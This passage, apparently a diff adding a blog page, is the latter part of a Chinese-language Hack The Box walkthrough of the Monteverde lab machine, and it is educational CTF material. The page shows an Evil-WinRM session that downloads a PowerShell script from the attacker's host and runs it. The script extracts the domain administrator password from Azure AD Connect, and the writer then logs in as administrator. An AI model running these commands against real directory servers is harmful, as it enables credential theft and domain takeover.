4:40:05 PM</span></span><br><span class="line"><span class="string">Password expires             Never</span></span><br><span class="line"><span class="string">Password changeable          1/3/2020 4:40:05 PM</span></span><br><span class="line"><span class="string">Password required            Yes</span></span><br><span class="line"><span class="string">User may change password     No</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Workstations allowed         All</span></span><br><span class="line"><span class="string">Logon script</span></span><br><span class="line"><span class="string">User profile</span></span><br><span class="line"><span class="string">Home directory               \\monteverde\users$\mhope</span></span><br><span class="line"><span class="string">Last logon                   1/3/2020 6:29:59 AM</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Logon hours allowed          All</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Local Group Memberships      *Remote Management Use</span></span><br><span class="line"><span class="string">Global Group memberships     *Azure Admins         *Domain Users</span></span><br><span class="line"><span class="string">The command completed successfully.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">*Evil-WinRM* PS C:\Users\mhope\desktop&gt; </span></span><br></pre></td></tr></table></figure>
+
+<h4 id="Azure："><a href="#Azure：" class="headerlink" title="Azure："></a>Azure：</h4><p>mhope是组Azure Admins成员。关于Azure，可学习：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://blog.xpnsec.com/azuread-connect-for-redteam/</span><br></pre></td></tr></table></figure>
+
+<p>摘自以上原文：</p>
+<p>第一个，可以说是最有趣的是密码哈希同步 (PHS)，它将用户帐户和密码哈希从 Active Directory 上传到 Azure。第二种方法是直通身份验证 (PTA)，它允许 Azure 将身份验证请求转发到本地 AD，而不是依赖于上传哈希。最后，我们有了联合身份验证，这是我们多次看到的传统 ADFS 部署。PHS……闻起来像 DCSync要开始我们对 PHS 的分析，我们应该查看负责处理密码哈希同步的程序集之一，<code>Microsoft.Online.PasswordSynchronization.dll</code>. 此程序集可以在 Azure AD Sync 的默认安装路径中找到<code>C:\Program Files\Microsoft Azure AD Sync\Bin</code>。</p>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">*Evil<span class="literal">-WinRM</span>* <span class="built_in">PS</span> C:\Program Files\Microsoft Azure AD Sync\Bin&gt; <span class="built_in">ls</span> *Microsoft.Online.PasswordSynchronization.dll*</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    Directory: C:\Program Files\Microsoft Azure AD Sync\Bin</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Mode                LastWriteTime         Length Name</span><br><span class="line"><span class="literal">----</span>                <span class="literal">-------------</span>         <span class="literal">------</span> <span class="literal">----</span></span><br><span class="line"><span class="literal">-a----</span>        <span class="number">8</span>/<span class="number">31</span>/<span class="number">2018</span>   <span class="number">4</span>:<span class="number">54</span> PM         <span class="number">136248</span> Microsoft.Online.PasswordSynchronization.dll</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">*Evil<span class="literal">-WinRM</span>* <span class="built_in">PS</span> C:\Program Files\Microsoft Azure AD Sync\Bin&gt; </span><br></pre></td></tr></table></figure>
+
+<p><code>C:\Program Files\Microsoft Azure AD Sync\Bin\mcrypt.dll</code>负责密钥管理和解密此数据的程序集的引用：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">*Evil-WinRM* PS C:\Program Files\Microsoft Azure AD Sync\Bin&gt; <span class="built_in">ls</span> *mcrypt.dll*</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    Directory: C:\Program Files\Microsoft Azure AD Sync\Bin</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Mode                LastWriteTime         Length Name</span><br><span class="line">----                -------------         ------ ----</span><br><span class="line">-a----        8/31/2018   4:54 PM         335744 mcrypt.dll</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">*Evil-WinRM* PS C:\Program Files\Microsoft Azure AD Sync\Bin&gt; </span><br></pre></td></tr></table></figure>
+
+<p>我直接引用了大佬的POC脚本：</p>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">*Evil<span class="literal">-WinRM</span>* <span class="built_in">PS</span> C:\Program Files\Microsoft Azure AD Sync\Bin&gt; <span class="built_in">cd</span> /programdata</span><br><span class="line">*Evil<span class="literal">-WinRM</span>* <span class="built_in">PS</span> C:\programdata&gt; <span class="built_in">wget</span> http://<span class="number">10.10</span>.<span class="number">16.11</span>/<span class="built_in">Get-AzureADPasswd</span>.ps1 <span class="literal">-O</span> <span class="built_in">Get-AzureADPasswd</span>.ps1</span><br><span class="line">*Evil<span class="literal">-WinRM</span>* <span class="built_in">PS</span> C:\programdata&gt; . .\<span class="built_in">Get-AzureADPasswd</span>.ps1</span><br><span class="line">Domain: MEGABANK.LOCAL</span><br><span class="line">Username: administrator</span><br><span class="line">Password: d0m@in4dminyeah!</span><br><span class="line">*Evil<span class="literal">-WinRM</span>* <span class="built_in">PS</span> C:\programdata&gt; </span><br></pre></td></tr></table></figure>
+
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$</span> evil<span class="literal">-winrm</span> <span class="literal">-i</span> <span class="number">10.10</span>.<span class="number">10.172</span> <span class="literal">-u</span> administrator <span class="literal">-p</span> d0m@in4dminyeah!  </span><br><span class="line"></span><br><span class="line">Evil<span class="literal">-WinRM</span> shell v3.<span class="number">3</span></span><br><span class="line"></span><br><span class="line">Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() <span class="function"><span class="keyword">function</span> <span class="title">is</span> <span class="title">unimplemented</span> <span class="title">on</span> <span class="title">this</span> <span class="title">machine</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">Data</span>: <span class="keyword">For</span> more information, check Evil<span class="literal">-WinRM</span> Github: https://github.com/Hackplayers/evil<span class="literal">-winrm</span><span class="comment">#Remote-path-completion</span></span><br><span class="line"></span><br><span class="line">Info: Establishing connection to remote endpoint</span><br><span class="line"></span><br><span class="line">*Evil<span class="literal">-WinRM</span>* <span class="built_in">PS</span> C:\Users\Administrator\Documents&gt; <span class="built_in">type</span> ../desktop/root.txt</span><br><span class="line"><span class="number">129</span>............................................</span><br></pre></td></tr></table></figure>
+
+
+                
+              </div>
+            
+            <hr/>
+            <div>
+              <div class="post-metas my-3">
+  
+    <div class="post-meta mr-3 d-flex align-items-center">
+      <i class="iconfont icon-category"></i>
+      
+
+<span class="category-chains">
+  
+  
+    
+      <span class="category-chain">
+        
+  <a href="/categories/Hack-The-Box/" class="category-chain-item">Hack The Box</a>
+  
+  
+
+      </span>
+    
+  
+</span>
+
+    </div>
+  
+  
+    <div class="post-meta">
+      <i class="iconfont icon-tags"></i>
+      
+        <a href="/tags/Active-Directory/" class="print-no-link">#Active Directory</a>
+      
+    </div>
+  
+</div>
+
+
+              
+  
+
+  <div class="license-box my-3">
+    <div class="license-title">
+      <div>HTB Walkthrough - Monteverde</div>
+      <div>https://crazyinside.github.io/post/HackTheBox-Monteverde.html</div>
+    </div>
+    <div class="license-meta">
+      
+        <div class="license-meta-item">
+          <div>Author</div>
+          <div>World'sEnd</div>
+        </div>
+      
+      
+        <div class="license-meta-item license-meta-date">
+          <div>Posted on</div>
+          <div>August 14, 2023</div>
+        </div>
+      
+      
+      
+        <div class="license-meta-item">
+          <div>Licensed under</div>
+          <div>
+            
+              
+              
+                <a class="print-no-link" target="_blank" href="https://creativecommons.org/licenses/by/4.0/">
+                  <span class="hint--top hint--rounded" aria-label="BY - Attribution">
+                    <i class="iconfont icon-by"></i>
+                  </span>
+                </a>
+              
+            
+          </div>
+        </div>
+      
+    </div>
+    <div class="license-icon iconfont"></div>
+  </div>
+
+
+
+              
+                <div class="post-prevnext my-3">
+                  <article class="post-prev col-6">
+                    
+                    
+                      <a href="/post/HackTheBox-Multimaster.html" title="HTB Walkthrough Multimaster">
+                        <i class="iconfont icon-arrowleft"></i>
+                        <span class="hidden-mobile">HTB Walkthrough Multimaster</span>
+                        <span class="visible-mobile">Previous</span>
+                      </a>
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/post/HackTheBox-Meta.html" title="HTB Walkthrough - Meta">
+                        <span class="hidden-mobile">HTB Walkthrough - Meta</span>
+                        <span class="visible-mobile">Next</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+          </article>
+        </div>
+      </div>
+    </div>
+
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+  <aside class="sidebar" style="margin-left: -1rem">
+    <div id="toc">
+  <p class="toc-header">
+    <i class="iconfont icon-list"></i>
+    <span>Table of Contents</span>
+  </p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+
+
+  </aside>
+
+
+    </div>
+  </div>
+</div>
+
+
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+
+
+
+
+    
+
+    
+      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">Search</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v" for="local-search-input">Keyword</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+    
+
+    
+  </main>
+
+  <footer>
+    <div class="footer-inner">
+  
+    <div class="footer-content">
+       <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
+    </div>
+  
+  
+  
+  
+</div>
+
+  </footer>
+
+  <!-- Scripts -->
+  
+  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://lib.baomitu.com/jquery/3.6.0/jquery.min.js" ></script>
+<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+
+  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var subtitle = document.getElementById('subtitle');
+      if (!subtitle || !typing) {
+        return;
+      }
+      var text = subtitle.getAttribute('data-typed-text');
+      
+        typing(text);
+      
+    })(window, document);
+  </script>
+
+
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.18.2/tocbot.min.js', function() {
+    var toc = jQuery('#toc');
+    if (toc.length === 0 || !window.tocbot) { return; }
+    var boardCtn = jQuery('#board-ctn');
+    var boardTop = boardCtn.offset().top;
+
+    window.tocbot.init(Object.assign({
+      tocSelector     : '#toc-body',
+      contentSelector : '.markdown-body',
+      linkClass       : 'tocbot-link',
+      activeLinkClass : 'tocbot-active-link',
+      listClass       : 'tocbot-list',
+      isCollapsedClass: 'tocbot-is-collapsed',
+      collapsibleClass: 'tocbot-is-collapsible',
+      scrollSmooth    : true,
+      includeTitleTags: true,
+      headingsOffset  : -boardTop,
+    }, CONFIG.toc));
+    if (toc.find('.toc-list-item').length > 0) {
+      toc.css('visibility', 'visible');
+    }
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('tocbot' in window) {
+        tocbot.refresh();
+        var toc = jQuery('#toc');
+        if (toc.length === 0 || !tocbot) {
+          return;
+        }
+        if (toc.find('.toc-list-item').length > 0) {
+          toc.css('visibility', 'visible');
+        }
+      }
+    });
+  });
+</script>
+
+
+  <script src=https://lib.baomitu.com/clipboard.js/2.0.11/clipboard.min.js></script>
+
+  <script>Fluid.plugins.codeWidget();</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/4.3.1/anchor.min.js', function() {
+    window.anchors.options = {
+      placement: CONFIG.anchorjs.placement,
+      visible  : CONFIG.anchorjs.visible
+    };
+    if (CONFIG.anchorjs.icon) {
+      window.anchors.options.icon = CONFIG.anchorjs.icon;
+    }
+    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+    var res = [];
+    for (var item of el) {
+      res.push('.markdown-body > ' + item.trim());
+    }
+    if (CONFIG.anchorjs.placement === 'left') {
+      window.anchors.options.class = 'anchorjs-link-left';
+    }
+    window.anchors.add(res.join(', '));
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('anchors' in window) {
+        anchors.removeAll();
+        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+        var res = [];
+        for (var item of el) {
+          res.push('.markdown-body > ' + item.trim());
+        }
+        if (CONFIG.anchorjs.placement === 'left') {
+          anchors.options.class = 'anchorjs-link-left';
+        }
+        anchors.add(res.join(', '));
+      }
+    });
+  });
+</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
+    Fluid.plugins.fancyBox();
+  });
+</script>
+
+
+  <script>Fluid.plugins.imageCaption();</script>
+
+  <script  src="/js/local-search.js" ></script>
+
+
+
+
+
+<!-- 主题的启动项，将它保持在最底部 -->
+<!-- the boot of the theme, keep it at the bottom -->
+<script  src="/js/boot.js" ></script>
+
+
+  
+
+  <noscript>
+    <div class="noscript-warning">Blog works best with JavaScript enabled</div>
+  </noscript>
+</body>
+</html>
